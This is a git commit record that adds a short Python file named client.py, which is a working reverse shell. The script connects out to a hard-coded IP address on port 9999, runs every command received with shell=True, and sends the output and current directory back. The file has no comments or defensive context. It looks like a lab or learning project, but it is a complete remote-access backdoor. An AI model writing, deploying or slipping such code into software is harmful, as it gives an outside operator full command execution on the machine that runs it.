970d994d79e24772f5c4e8037fb30c069b9c7381
Alex Grefu <alex.grefu@jlg.ro>
2017-12-19 18:25:26 +0200

    added untracked files

---
+++ client.py
@@ -0,0 +1,19 @@
+import socket
+import os
+import subprocess
+
+s = socket.socket()
+host = '10.10.254.239'
+port = 9999
+
+s.connect((host, port))
+
+while True:
+    data = s.recv(1024)
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte)
+        currentWD = os.getcwd() + '>'
+        s.send(str.encode(output_str + currentWD))
+        print(output_str)
